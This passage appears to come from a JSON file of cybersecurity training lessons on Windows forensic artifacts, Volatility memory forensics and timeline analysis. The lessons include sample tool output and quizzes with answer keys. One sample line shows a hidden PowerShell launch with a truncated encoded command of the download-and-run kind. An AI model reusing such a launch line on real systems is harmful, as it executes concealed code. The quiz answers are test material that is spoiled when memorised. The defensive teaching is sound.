tools, and what each one honestly proves. Master the artifact map and you can reconstruct an intrusion from the traces an attacker never knew they left — which is exactly the Tier-2 skill that turns \"something happened\" into a documented, defensible account of what happened."
    },
    {
      "heading": "Anti-Forensics and a Worked Case Study",
      "content": "Bringing every artifact in this lesson together, here is how a real reconstruction reads. A SOC gets an EDR alert for suspicious PowerShell activity on `WKS-DESKTOP07`; the Security event log for the relevant hour is missing (cleared). The analyst runs the toolkit from the previous section and assembles this table:\n\n| Time (UTC) | Artifact | What it shows |\n|------------|----------|----------------|\n| 13:58:40 | LNK (parsed with LECmd) | User opened `invoice_Q3.docm` from an email attachment folder |\n| 14:05:00 | Prefetch (PECmd) | `WINWORD.EXE` and, seconds later, `POWERSHELL.EXE` both show first-ever execution |\n| 14:05:02 | MFT (MFTECmd) | `evil.ps1` appears in `C:\\Users\\Public\\`; `$STANDARD_INFORMATION` claims 2019, `$FILE_NAME` shows 14:05:02 today — a timestomp |\n| 14:05:05 | Amcache | Entry for `evil.ps1` with a SHA-1 hash matching a known malware family in threat intel |\n| 14:06:10 | BAM/DAM (RECmd) | Confirms `powershell.exe` executed under the logged-on user's SID at 14:06 |\n| 14:07:00 | ShellBags (SBECmd) | User's profile shows no prior browsing history to `C:\\Users\\Public\\` — this folder use is new and abnormal |\n\nNo single row proves the case. But read top to bottom, the story is airtight: a phishing document was opened, it spawned PowerShell (an unusual parent-child relationship in its own right), that PowerShell dropped a file whose author tried to timestomp it to look years old, the file's hash matches known malware, and the folder it landed in had never been touched by this user before. The **cleared Security log** — the attacker's actual anti-forensic move — did nothing to stop this reconstruction, because none of the six artifacts above depend on that log existing.\n\n### The general lesson\n\nThis is the payoff of learning the whole artifact map rather than one favourite tool: an attacker who is thorough about covering *logs* is rarely thorough about covering *every registry hive and file-system structure* too, because there are simply too many of them, scattered across too many places, most of which are undocumented outside forensic circles. Each additional artifact you know how to parse is one more place the attacker had to remember to clean — and in practice, they rarely remember all of them. That gap between what an attacker thinks they hid and what Windows actually recorded is where Tier-2 forensic investigations are won."
    }
  ],
  "keyTakeaways": [
    "A forensic artifact is a trace Windows creates automatically for its own convenience (not a security log); artifacts survive log-clearing, fill logging gaps, and defeat anti-forensics because attackers rarely know every place they were recorded — the registry (organised into hives) and NTFS (with its MFT) are where most of them live.",
    "Execution artifacts answer 'did this run?': Prefetch (strong evidence + run count/last-run times), Amcache (path + SHA-1 hash), Shimcache/AppCompatCache (presence, NOT guaranteed execution), UserAssist (GUI-launched programs), and BAM/DAM (per-user execution timestamps) — correlate several rather than trusting one.",
    "The MFT ($MFT) records every file with MACB timestamps (Modified/Accessed/Changed/Born) in two structures — $STANDARD_INFORMATION (easily changed) and $FILE_NAME (harder to alter) — and a mismatch between them exposes timestomping, an anti-forensic backdating trick (MITRE Indicator Removal).",
    "User-activity artifacts reconstruct what a person did: LNK files and Jump Lists show files opened (even from removed drives), RecentDocs shows recent files by extension, ShellBags show folders browsed in Explorer, and USBSTOR/MountedDevices show which removable devices were connected and when.",
    "Real tools parse these formats: Eric Zimmerman's suite (PECmd, AmcacheParser, AppCompatCacheParser, MFTECmd, LECmd, JLECmd, SBECmd, RECmd) turns binary hives and the MFT into CSV tables, and KAPE collects the right files first — the workflow is collect, parse, filter, then corroborate multiple artifacts into one defensible narrative."
  ],
  "quiz": [
    {
      "question": "During an investigation the attacker cleared the Windows Security event log, so you cannot confirm from logs that their tool ran. You find MIMIKATZ.EXE-A1B2C3D4.pf in C:\\Windows\\Prefetch with a run count of 3 and recent run times. What can you conclude, and why?",
      "options": [
        {
          "label": "Nothing, because once the Security event log is cleared there is no remaining way on Windows to prove that any particular program was ever executed.",
          "value": "a"
        },
        {
          "label": "The Prefetch artifact is strong evidence the tool executed (with a run count and last-run times), surviving the log-clearing the attacker performed.",
          "value": "b"
        },
        {
          "label": "Only that the file existed on disk, because Prefetch records the presence of files but can never indicate whether a program was actually run.",
          "value": "c"
        },
        {
          "label": "That the tool was blocked, because a Prefetch file is created by antivirus specifically to record executables it prevented from running on the host.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Prefetch is a byproduct Windows creates to speed up launching programs, so a .pf file with a run count and last-run times is strong evidence the tool executed — and because it is a separate artifact from the Security log, it survives the attacker clearing that log. Option a is wrong because artifacts like Prefetch remain after log-clearing. Option c confuses Prefetch (execution) with presence-only artifacts like Shimcache. Option d invents an antivirus origin; Prefetch is created by Windows for performance, not by AV to log blocks."
    },
    {
      "question": "Why do experienced forensic analysts treat Shimcache (AppCompatCache) differently from Prefetch when trying to prove a program executed?",
      "options": [
        {
          "label": "Shimcache indicates a program was present/registered by the compatibility system, which does not by itself guarantee execution, so it needs corroboration.",
          "value": "a"
        },
        {
          "label": "Shimcache is stored only in memory and disappears at shutdown, so unlike Prefetch it can never be recovered during a post-incident investigation.",
          "value": "b"
        },
        {
          "label": "Shimcache records the full contents of every executed file, making it so large that analysts avoid it in favour of the smaller Prefetch artifact.",
          "value": "c"
        },
        {
          "label": "Shimcache is created only by third-party antivirus tools, so its presence depends entirely on which security product happened to be installed.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "Shimcache (AppCompatCache) records executables the compatibility system encountered — path, size, last-modified time — which shows presence/registration but does not by itself prove the program actually ran, so analysts corroborate it with execution artifacts like Prefetch or Amcache. Option b is wrong because Shimcache lives in the SYSTEM registry hive and is recoverable. Option c is false; it stores metadata, not file contents. Option d is wrong because Shimcache is a native Windows artifact, not an AV product."
    },
    {
      "question": "You parse a suspicious file's MFT record and see $STANDARD_INFORMATION shows a creation date of 2019, but $FILE_NAME shows it was created today, matching the intrusion window. A LNK file, Amcache hash, and BAM/DAM entry all corroborate execution around the same time today. What is the strongest supportable conclusion?",
      "options": [
        {
          "label": "The file is almost certainly legitimate, since one of the two timestamp structures agrees with the older 2019 date the attacker likely intended.",
          "value": "a"
        },
        {
          "label": "The mismatched MFT timestamps indicate timestomping, and combined with the corroborating LNK, Amcache, and BAM/DAM evidence, this points to a malicious file placed during the intrusion.",
          "value": "b"
        },
        {
          "label": "The MFT alone is enough, so the LNK, Amcache, and BAM/DAM entries add nothing further and can be safely ignored in the final report.",
          "value": "c"
        },
        {
          "label": "The discrepancy is a normal Windows behavior for all files and has no forensic significance whatsoever in an investigation.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "A $STANDARD_INFORMATION/$FILE_NAME mismatch is the classic signature of timestomping, and the discipline taught throughout this lesson is to corroborate: the LNK, Amcache hash, and BAM/DAM entry independently agreeing on today's date builds a solid, defensible finding rather than relying on one artifact. Option a wrongly trusts the easily-altered timestamp. Option c contradicts the lesson's core principle of corroboration. Option d dismisses a well-documented anti-forensic indicator (MITRE Indicator Removal: Timestomp)."
    }
  ],
  "references": [
    "https://learn.microsoft.com/en-us/windows/win32/fileio/master-file-table",
    "https://attack.mitre.org/techniques/T1070/006/",
    "https://www.sans.org/posters/windows-forensic-analysis/",
    "https://ericzimmerman.github.io/#!index.md",
    "https://learn.microsoft.com/en-us/windows/win32/w8cookbook/application-compatibility-cache"
  ],
  "xp": 255,
  "estimatedMinutes": 56,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-memory-forensics-volatility",
  "slug": "memory-forensics-with-volatility",
  "title": "Memory Forensics with Volatility",
  "topic": "Digital Forensics",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "Some of the most important evidence in a modern intrusion never touches the disk. Malware that runs only in memory, code injected into a trusted process, the live network connections to a command-and-control server, even decrypted data and credentials — all of it lives in RAM and vanishes the moment the machine powers off. Memory forensics is the discipline of capturing and analysing that volatile evidence, and Volatility is the open-source framework that made it accessible. This lesson assumes no prior forensics background: it explains what RAM even is and why it matters, how a memory image is captured, how to actually run Volatility (with real commands and sample output for its core plugins — pslist, pstree, psscan, netscan, malfind, dlllist, cmdline), how an analyst reads that output during a real investigation, and where memory forensics' limits are.",
  "sections": [
    {
      "heading": "Why Memory Is the Richest Evidence",
      "content": "A computer's **RAM (Random Access Memory)** holds the live, working state of everything currently happening on the machine: every running process, the code it is executing, its open network connections, and the data it is actively using. Unlike the disk, which stores things persistently, memory is **volatile** — its contents exist only while the machine is powered on and are lost the instant it shuts down or reboots. That fragility is exactly why memory is so valuable: it captures a moment of *live* activity that no static disk image can.\n\n### A quick analogy\n\nThink of RAM as a whiteboard and the disk as a filing cabinet. The whiteboard shows exactly what a team is working on *right now* — half-finished diagrams, notes being actively used — but wipe it and that working state is gone forever. The filing cabinet holds permanent records that survive being closed and reopened. A disk investigation reads the filing cabinet; a memory investigation reads the whiteboard before someone erases it. Some things — a diagram sketched, discussed, and rubbed out before ever being filed — only ever existed on the whiteboard.\n\n### What can exist in memory and nowhere on disk\n\n- **Running processes**, including malicious ones — and, crucially, processes an attacker tried to *hide* from the normal process list.\n- **Injected code** — malware that ran inside a legitimate process (recall DLL/process injection) leaves its code in that process's memory, not as a file.\n- **Fileless malware** — attacks that live entirely in memory, using PowerShell or scripts, that traditional file scanning cannot see because there is no file.\n- **Live network connections** — the active connections to a C2 server at the moment of capture.\n- **Decrypted data and credentials** — passwords, keys, and data that are encrypted on disk but must be decrypted in memory to be used.\n- **Command history and injected commands** — what was actually run.\n\nThis is why the **order of volatility** — a core forensic principle — says to collect the most fleeting evidence *first*: memory before disk, because a reboot destroys memory while the disk survives. If you power a suspicious machine off before capturing RAM, you may permanently lose the only evidence of a fileless or injected attack.\n\nMemory forensics therefore closes a gap that disk forensics and even some logging cannot: it catches the attacks that deliberately avoid the disk. As intruders increasingly go **fileless** and **inject** into trusted processes specifically to evade file-based defences, the ability to capture and read memory has moved from a niche skill to an essential Tier-2 capability. The rest of this lesson covers how you get a memory image and how Volatility turns that raw dump into answers."
    },
    {
      "heading": "Capturing a Memory Image",
      "content": "Before you can analyse memory, you have to **capture** it — create a copy of the machine's RAM as a file, called a **memory image** or **memory dump**. How you do this matters, because the act of capturing must disturb the evidence as little as possible.\n\n### Acquisition tools\n\nOn a live Windows machine, dedicated tools read physical memory and write it to a file. Common ones include **WinPmem**, **DumpIt**, **FTK Imager**, and **Magnet RAM Capture**. They produce a raw image (often several gigabytes, matching the machine's RAM size) that you then analyse offline. A typical capture with a command-line tool looks like:\n\n```\nC:\\Tools> winpmem.exe C:\\Evidence\\WKS-DESKTOP07_mem.raw\n```\n\nwhich streams the full contents of physical RAM into that single output file.\n\n### Virtual machines make it easy\n\nIf the target is a VM, its memory can often be captured simply by taking a **snapshot** or saving its state — the hypervisor writes the VM's RAM to a file you can analyse directly. This is one reason virtualised environments are convenient for both incident response and training.\n\n### The golden rule: capture memory first, and capture it live\n\nTwo principles follow from the order of volatility:\n\n- **Do not power off first.** Shutting down or rebooting destroys memory. If you suspect a fileless or injected attack, capture RAM *before* anything else touches the machine.\n- **Minimise your footprint.** The capture tool itself runs in memory and changes a little of it. Analysts accept this small, unavoidable disturbance and document it, choosing trusted tools that alter as little as possible.\n\n### Preserve it properly\n\nAs with all evidence, a memory image should be handled under **chain of custody** — hashed on capture (e.g. `certutil -hashfile WKS-DESKTOP07_mem.raw SHA256`), stored securely, and analysed on a *copy* — so the findings stand up to scrutiny (this connects to the evidence-collection lesson).\n\nOnce you have a sound image, the machine's live state is frozen in a file you can examine repeatedly without further risk. The image is just raw bytes, though — a multi-gigabyte block of memory with no obvious structure. Turning it into meaningful answers (which processes were running, what was injected, what connected out) requires a tool that understands the operating system's memory layout. That tool, for most of the industry, is Volatility."
    },
    {
      "heading": "Volatility Basics: Running Your First Plugin",
      "content": "**Volatility** is the leading open-source **memory-forensics framework**. It takes a raw memory image and, using knowledge of how operating systems organise memory, reconstructs the machine's state at the moment of capture. The current major version, **Volatility 3**, is the one this lesson uses; you may also encounter the older Volatility 2 with a slightly different command style.\n\n### How Volatility 'understands' an arbitrary image\n\nTo make sense of raw bytes, Volatility needs to know the exact layout the operating system used for its internal structures (how a process record is laid out in memory, for instance) — this reference information is called a **symbol table** (in Volatility 3's format, an **ISF**, Intermediate Symbol Format file). Volatility 3 automates most of this: it inspects the image, identifies the OS build, and fetches or uses the matching symbol information automatically in the common case, so as an analyst you usually do not have to hunt one down yourself.\n\n### The basic command shape\n\nEvery Volatility 3 command follows the same pattern: point it at the image with `-f`, then name a **plugin** — the specific question you want answered.\n\n```\n$ python3 vol.py -f WKS-DESKTOP07_mem.raw windows.pslist\n```\n\nRunning this might produce a table like:\n\n```\nPID    PPID   ImageFileName    Offset(V)          Threads  Handles  SessionId  CreateTime\n4      0      System           0xaf8b3c2a1040     142      0        N/A        2026-08-14 08:02:11 UTC\n612    4      smss.exe         0xaf8b3c2a5080     2        0        N/A        2026-08-14 08:02:12 UTC\n2988   3120   explorer.exe     0xaf8b3c650a10      31       540      1          2026-08-14 08:04:03 UTC\n3312   2988   powershell.exe   0xaf8b3c701c20      9        310      1          2026-08-14 09:40:57 UTC\n```\n\nRead this as a snapshot of every process alive at the instant of capture: its process ID (**PID**), parent process ID (**PPID**), name, and creation time. Already something jumps out — a `powershell.exe` created at 09:40, well after normal logon activity, with `explorer.exe` as its parent. That is consistent with a user having launched it manually, or with something disguising itself as user-launched activity; the next plugins help tell the difference.\n\n### Why start here\n\n`windows.pslist` (and its tree-shaped cousin, covered next) is almost always the first plugin an analyst runs, because it gives you the landscape: what was running, and roughly when. Every subsequent plugin narrows in on a process or a question this first view raises."
    },
    {
      "heading": "Core Process and Network Plugins",
      "content": "With the basics running, a handful of plugins cover most investigations. They map neatly to the evidence types from the first section.\n\n### pstree — processes as a family tree\n\n`windows.pstree` shows the same process list as `pslist`, but **indented to show parent-child relationships** — applying the process-lineage concept (from the process-analysis lesson) directly to memory:\n\n```\n$ python3 vol.py -f WKS-DESKTOP07_mem.raw windows.pstree\n\nPID   PPID  ImageFileName\n612   4      smss.exe\n2988  3120  * explorer.exe\n3312  2988    ** powershell.exe\n```\n\nThe indentation (`*`, `**`) shows `powershell.exe` is a child of `explorer.exe`, which is a child of the session process — a normal-looking chain for a user-launched shell, but still worth checking against what the user actually did (via the artifacts from the previous lesson, or an EDR command line).\n\n### psscan — catching what pslist misses\n\n`windows.psscan` scans memory for process structures **directly**, rather than walking the OS's own linked list of \"active\" processes the way `pslist` does. This distinction matters: some malware unlinks itself from that list (a classic rootkit technique) specifically so tools like `pslist` will not see it. `psscan` can still find the underlying structure in memory even after that unlinking, which is why it is the go-to plugin for **hidden or terminated processes**:\n\n```\n$ python3 vol.py -f WKS-DESKTOP07_mem.raw windows.psscan\n\nPID   PPID  ImageFileName    ExitTime\n4180  3312  svchost.exe      -\n```\n\nIf a PID like `4180` shows up in `psscan` but never appeared in `pslist`, that absence is itself a finding — a strong sign of deliberate concealment.\n\n### netscan — live connections\n\n`windows.netscan` recovers **network connections and listening ports** from memory, exposing live C2 connections and their remote addresses, tied back to the owning process:\n\n```\n$ python3 vol.py -f WKS-DESKTOP07_mem.raw windows.netscan\n\nOffset        Proto  LocalAddr      LocalPort  ForeignAddr     ForeignPort  State        PID   Owner\n0xaf8b3d1120  TCPv4  10.14.22.108   51032      203.0.113.44    443          ESTABLISHED  3312  powershell.exe\n```\n\nThis single row is powerful: it ties the suspicious `powershell.exe` from `pstree` to a live, established connection to an external IP on port 443 (HTTPS) at the moment of capture — a plausible C2 channel, and a concrete IP to pivot on in firewall or proxy logs.\n\n### Reading these three together\n\n`pstree` gives you the landscape and flags odd parent-child pairs; `psscan` catches what tried to hide; `netscan` shows who was talking to whom. Together, in three commands, you already have a short list of suspect processes and their network activity — before you have looked at a single byte of injected code, which is the next section's job."
    },
    {
      "heading": "Finding Injection and Fileless Malware: malfind and Friends",
      "content": "The plugins so far show *what was running* and *who it talked to*. The next question — is there code hiding *inside* an otherwise legitimate process — is what makes memory forensics indispensable against modern intrusions.\n\n### malfind — the signature-hunting plugin for injection\n\n`windows.malfind` looks for memory regions that are **executable but not backed by a file on disk** — the fingerprint of process injection and much fileless malware. A normal process's executable code is mapped from its `.exe` or `.dll` file on disk; injected code has no such backing file, because it was written directly into memory by another process (or by a script). That mismatch is exactly what `malfind` flags:\n\n```\n$ python3 vol.py -f WKS-DESKTOP07_mem.raw windows.malfind\n\nPID   Process         Start VPN            End VPN              Protection\n3312  powershell.exe  0x000001f5a2c30000   0x000001f5a2c50000   PAGE_EXECUTE_READWRITE\n\nHexdump:\n4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00   MZ..............\n```\n\nTwo details matter here. First, `PAGE_EXECUTE_READWRITE` is itself suspicious — legitimate code is rarely marked simultaneously writable and executable, because that combination is exactly what code injection needs and what modern OS protections try to discourage. Second, the hexdump begins with `4D 5A` — the letters `MZ`, the standard signature at the start of a Windows executable — meaning there is an entire embedded executable sitting inside `powershell.exe`'s memory with no matching file on disk. That is about as clear a fingerprint of injection as memory forensics produces.\n\n### dlllist and ldrmodules — spotting unlinked modules\n\n`windows.dlllist` shows the DLLs a process has loaded, and `windows.ldrmodules` cross-checks that list against the OS's own module-tracking structures — a mismatch (a DLL missing from one list but not the other) can indicate a **reflectively-loaded** or unlinked module, another injection technique.\n\n### cmdline — how the process was actually launched\n\n`windows.cmdline` recovers the **command-line arguments** each process was started with, which is often the single most revealing piece of evidence:\n\n```\n$ python3 vol.py -f WKS-DESKTOP07_mem.raw windows.cmdline\n\nPID   Process         Args\n3312  powershell.exe  powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdw...\n```\n\n`-w hidden` (hidden window) and `-enc` (a Base64-encoded command) are hallmark flags of a malicious or scripted launch, not something a user typing at a prompt would produce.\n\n### Putting it together\n\nOne plugin run at a time, a picture assembles: `pstree` showed `powershell.exe` running under `explorer.exe`; `netscan` showed it connected to an external IP; `malfind` found an embedded executable injected into its memory with suspicious read-write-execute permissions; `cmdline` shows it was launched hidden with an encoded command. Four short plugin outputs, read together, prove a fileless, injected intrusion that a file-based antivirus scan would likely have missed entirely, because none of this evidence exists as a file on disk."
    },
    {
      "heading": "Reading a Memory Image in an Investigation",
      "content": "Knowing the plugins is the mechanics; using them to answer real questions in the right order is the skill. Memory forensics shines in a specific set of investigative situations, and recognising them tells you when to reach for it.\n\n**When memory forensics is the right tool:**\n\n- **Suspected fileless or in-memory malware** — when EDR or AV found little on disk but the machine behaves as if compromised, memory may hold the only evidence.\n- **Suspected process injection** — `malfind` is purpose-built to find code injected into trusted processes, which is invisible to file scanning.\n- **Hidden processes or rootkit-like behaviour** — `psscan` can surface processes deliberately removed from the normal list.\n- **Confirming live C2** — `netscan` captures the actual connections at the moment of capture, tying an infection to its operator.\n- **Recovering volatile secrets** — decrypted data, keys, or command history that exist only in RAM.\n\n### The analytical pattern: start broad, then drill in\n\nThe worked example in the previous section is the template for almost every memory investigation: run `pstree` to see the process landscape and spot anything odd — a process with a suspicious name, an unusual parent, or one that should not exist. Cross-check with `psscan` to catch hidden processes. Point `malfind` at a suspect process to confirm injected code. Use `netscan` to see if it was talking to an external server, and `cmdline` to see how it was launched. In a few plugin runs you move from a raw image to a concrete finding: *this process, injected with code, was connecting to this IP, launched by this command.*\n\n### Combine memory with everything else\n\nMemory forensics is most powerful as one layer of a broader investigation. The injected-code finding from `malfind` pairs with the **Windows artifacts** lesson (did the loader run? check Prefetch/Amcache/BAM), the **timeline** lesson (when did this happen, relative to everything else?), and network data (was the C2 IP seen in firewall or proxy logs?). Memory answers \"what was live at this instant\"; the other sources answer \"how did it get here and what did it do over time.\"\n\nThat is the power of memory forensics — Volatility turns an opaque block of RAM into the same kind of readable story you would get from EDR, but for a machine that had no EDR, or for the fileless activity EDR itself might have missed."
    },
    {
      "heading": "Limits, Anti-Memory-Forensics, and Combining With Other Evidence",
      "content": "Memory forensics is powerful within its niche, but it has real limits, and attackers who know about it try to work around it. A mature analyst understands both.\n\n### It is a single snapshot, not a history\n\nA memory image captures the machine at **one instant**. Activity that started and fully ended *before* the capture — a process that ran and exited an hour earlier — may leave little or nothing in the image (though some remnants can occasionally be recovered from unallocated memory regions). This is why capturing *early*, as soon as compromise is suspected, matters so much: the longer you wait, the more the live evidence you need has a chance to be overwritten by ordinary system activity.\n\n### Attackers can target memory forensics specifically\n\nJust as attackers timestomp files to defeat disk forensics, sophisticated intruders take steps aimed at memory analysis:\n\n- **Re-linking or partial unlinking** to reduce what `psscan` finds, or timing activity to finish and clean up before an expected capture.\n- **Avoiding `RWX` (read-write-execute) memory pages** specifically because tools like `malfind` flag that permission combination, using more careful memory-permission sequences instead.\n- **In-memory-only, short-lived payloads** that execute and deallocate quickly, minimising the window in which a capture would catch them.\n\nNone of these make an attacker invisible — they simply raise the bar, in the same way timestomping raises the bar on disk forensics rather than defeating it outright. The same principle from the artifacts lesson applies: the *attempt* to evade memory forensics (unusual memory permissions, structural inconsistencies between `pslist` and `psscan`) is itself often a detectable anomaly.\n\n### Practical and technical limits\n\n- **Version and symbol sensitivity.** Volatility needs to understand the specific OS build's internal layout; while Volatility 3 automates this well for common, current systems, unusual or very new builds can occasionally require extra setup.\n- **Image size and time.** A modern server's memory can be tens or hundreds of gigabytes, so both capture and analysis take real time and disk space.\n- **Interpretation still needs a human.** Plugins surface candidates (an RWX region, an unlisted process); deciding whether a specific finding is malicious or a rare-but-legitimate pattern still requires analyst judgement and corroboration, exactly as with the artifact-correlation principle from the previous lesson.\n\n### The essential takeaway\n\nFor a Tier-2 analyst, the discipline is simple to state and important to internalise: **capture RAM early — before powering off, before too much time passes — because that fleeting evidence is often the only proof of the very attacks designed to leave none on disk.** Then read the result the way you read any forensic evidence: start broad with `pstree`/`psscan`, drill into anomalies with `malfind`/`netscan`/`cmdline`, and corroborate every finding against artifacts, timeline, and network logs before calling it conclusive."
    }
  ],
  "keyTakeaways": [
    "RAM is volatile but holds the richest live evidence — running (and hidden) processes, injected code, fileless malware, active C2 connections, and decrypted credentials — much of which exists nowhere on disk, so the order of volatility says capture memory before disk and never power off a suspect machine first.",
    "A memory image/dump is captured live with tools like WinPmem, DumpIt, FTK Imager, or (for VMs) a snapshot; capture with minimal footprint, hash it, and analyse a copy under chain of custody.",
    "Volatility 3 runs plugins against an image with `python3 vol.py -f <image> <plugin>`, auto-detecting the OS's symbol information (ISF); start with windows.pslist/pstree for the process landscape.",
    "windows.psscan finds processes hidden from pslist (e.g. unlinked by a rootkit technique), windows.netscan recovers live network connections tied to a PID, and windows.malfind flags memory regions that are executable but not backed by a file on disk — often paired with suspicious PAGE_EXECUTE_READWRITE permissions — the fingerprint of injection; windows.cmdline and dlllist/ldrmodules round out the picture.",
    "Reach for memory forensics for fileless malware, process injection, hidden processes, and confirming live C2; corroborate its findings with Windows artifacts, timeline, and network data, remembering an image is a single snapshot in time (capture early), and that attackers can specifically try to evade memory analysis (e.g. avoiding RWX pages) just as they timestomp files against disk forensics."
  ],
  "quiz": [
    {
      "question": "An EDR alert suggests a workstation is compromised, but a full disk scan finds nothing malicious. You suspect fileless malware or code injected into a legitimate process. Why is capturing and analysing memory the right next step, and what must you avoid?",
      "options": [
        {
          "label": "Memory analysis is pointless here; you should immediately reboot the machine to clear the infection, since fileless malware cannot survive a restart anyway.",
          "value": "a"
        },
        {
          "label": "Fileless/injected code lives in RAM and often not on disk, so capture memory before powering off — a reboot would destroy the only evidence of the attack.",
          "value": "b"
        },
        {
          "label": "You should power the machine off first to preserve the disk, then capture memory afterward from the powered-down drive using a standard imaging tool.",
          "value": "c"
        },
        {
          "label": "Memory holds no evidence of injected code, so the clean disk scan already proves the alert was a false positive and no further action is needed.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Fileless and injected malware runs in RAM and frequently leaves nothing on disk, so a clean disk scan does not clear the machine; you capture memory while it is still powered on because the order of volatility means a reboot destroys that fleeting evidence. Option a is dangerous — rebooting destroys the very evidence and does not guarantee removal. Option c is impossible, since a powered-off drive holds no RAM. Option d wrongly treats a clean disk scan as proof of no compromise."
    },
    {
      "question": "You have a memory image and want to find code that was injected into a legitimate process (a common fileless technique). Which Volatility plugin is purpose-built for this, and what does it look for?",
      "options": [
        {
          "label": "The cmdline plugin, which lists command-line arguments and therefore directly displays the full source code of any injected payload in the process.",
          "value": "a"
        },
        {
          "label": "The malfind plugin, which flags memory regions that are executable but not backed by a file on disk — the fingerprint of injected code.",
          "value": "b"
        },
        {
          "label": "The pslist plugin, which lists visible processes and is guaranteed to include every hidden or injected process running on the system at capture time.",
          "value": "c"
        },
        {
          "label": "The hivelist plugin, which enumerates registry hives in memory and is the standard way to detect code injected into a running process's address space.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "malfind is designed to hunt for injected code: it flags memory regions that are executable yet not backed by a file on disk, which is the signature of process injection and many fileless techniques. Option a is wrong because cmdline shows launch arguments, not injected code. Option c is wrong because pslist shows visible processes and can miss hidden ones (psscan is used for those), and it does not identify injection. Option d is wrong because hivelist enumerates registry hives, unrelated to detecting injection."
    },
    {
      "question": "You run windows.pslist and see no sign of a suspicious process, but windows.psscan reveals a PID that never appeared in the pslist output. What does this discrepancy most likely indicate, and which plugin caught it?",
      "options": [
        {
          "label": "A harmless timing difference between the two commands; psscan and pslist always return identical results and the discrepancy should be ignored.",
          "value": "a"
        },
        {
          "label": "The process was likely unlinked from the OS's active-process list to hide from tools like pslist, and psscan found it by scanning memory structures directly.",
          "value": "b"
        },
        {
          "label": "The disk image is corrupted, so psscan is scanning the wrong offsets and its result should be discarded in favor of the trusted pslist output.",
          "value": "c"
        },
        {
          "label": "psscan only reports processes that have already exited normally, so the extra PID simply reflects ordinary process termination with no security relevance.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "pslist walks the OS's own list of 'active' processes, which malware can deliberately unlink itself from (a classic rootkit technique); psscan instead scans memory for process structures directly, so it can still find a process that pslist misses — a strong sign of deliberate concealment. Option a dismisses a meaningful and well-documented discrepancy. Option c misattributes the difference to corruption rather than the two plugins' different methods. Option d is only partly true (psscan can show exited processes too) but misses the concealment significance of a PID absent from pslist entirely."
    }
  ],
  "references": [
    "https://volatility3.readthedocs.io/en/latest/",
    "https://attack.mitre.org/techniques/T1055/",
    "https://www.sans.org/posters/hunt-evil/",
    "https://github.com/volatilityfoundation/volatility3",
    "https://attack.mitre.org/techniques/T1055/012/"
  ],
  "xp": 265,
  "estimatedMinutes": 58,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-timeline-analysis-super-timelines",
  "slug": "timeline-analysis-and-super-timelines",
  "title": "Timeline Analysis and Super-Timelines",
  "topic": "Digital Forensics",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "An intrusion is a sequence of events in time: the phishing email arrived, the document was opened, a tool ran, credentials were stolen, another machine was reached. Scattered across logs and artifacts, those events are just isolated facts — but ordered on a single timeline, they become a story you can read. Timeline analysis is the discipline of arranging evidence chronologically to reconstruct exactly what happened, in what order, and it is one of the most powerful techniques a Tier-2 investigator has. This lesson assumes no prior background: it explains what a timestamp actually is and why time zones trip people up, how to build a combined 'super-timeline' with the real tool log2timeline/Plaso (with actual commands and sample output), how to navigate the millions of rows that produces, how attackers try to falsify the temporal record, and finishes with a full worked reconstruction that ties Windows artifacts, memory findings, and logs into one narrative.",
  "sections": [
    {
      "heading": "Why the Order of Events Is the Investigation",
      "content": "At its core, investigating an incident means answering questions of **sequence**: What happened first? What did it lead to? What was the very first malicious action (**patient zero**), and how far did the attacker get (the **blast radius**)? These are fundamentally questions about *time*, and the technique for answering them is **timeline analysis** — placing evidence in chronological order so the sequence of an attack becomes visible.\n\nThink of it like a detective assembling a case. Individual clues — a fingerprint here, a receipt there, a witness statement — mean little in isolation. Arranged on a timeline, they reveal a narrative: the suspect was *here* at 9, bought *this* at 9:30, was seen *there* at 10. Digital evidence works the same way. A single log entry says a program ran; a single artifact says a file appeared. But ordered together, they show that a phishing email arrived at 14:02, the attachment was opened at 14:05, PowerShell ran at 14:05, a tool was downloaded at 14:06, and a connection to an external server opened at 14:07 — a coherent attack chain.\n\nTimeline analysis delivers three things no single piece of evidence can:\n\n- **Causality and sequence.** Seeing that event B always follows event A reveals how the attack unfolded and what caused what.\n- **Scope.** Following the timeline forward shows every machine and account the attacker touched — the blast radius you must contain.\n- **Root cause.** Following it backward leads to the initial access — the patient-zero action you must fix so it cannot happen again.\n\nThis is why timeline analysis sits at the heart of incident response. The messy reality of an investigation is dozens of data sources — event logs, forensic artifacts (Prefetch, the MFT, ShellBags — from the previous lesson), memory findings (from the Volatility lesson), firewall logs — each holding a fragment. The investigator's job is to weave those fragments into one ordered narrative. Do it well and the incident explains itself: you can point to the first click, trace each step, and show where it ended. The rest of this lesson covers the raw material of timelines (timestamps), the real tool for combining every source into a **super-timeline**, how to actually navigate one, and the ways attackers try to corrupt the record."
    },
    {
      "heading": "Timestamps — The Raw Material of Timelines",
      "content": "Every timeline is built from **timestamps**, and using them correctly requires understanding a few things that trip up beginners.\n\n### The MACB times\n\nOn Windows/NTFS, each file carries a set of timestamps often abbreviated **MACB**:\n\n- **M — Modified**: when the file's *content* last changed.\n- **A — Accessed**: when it was last read/accessed (note: access-time updates are sometimes disabled for performance, so this is not always reliable).\n- **C — Changed**: when the file's **MFT record** (metadata) last changed — distinct from content modification.\n- **B — Born (Created)**: when the file was created on the volume.\n\nReading these together tells a rich story: a file *created* at one time but *modified* earlier than its creation is suspicious; a tool whose *created* time matches the moment of intrusion places it in the attack.\n\n### Two places store the times\n\nNTFS keeps timestamps in two structures — **`$STANDARD_INFORMATION`** (the ones most tools and users see and that programs can change) and **`$FILE_NAME`** (harder for normal software to alter). This duplication is a gift to investigators, as the anti-forensics section will show. A tool like `MFTECmd` (from the artifacts lesson) can show both side by side for a single file:\n\n```\nEntryNumber: 84213   FileName: evil.ps1\nSI Created:  2019-03-11 10:02:00 UTC   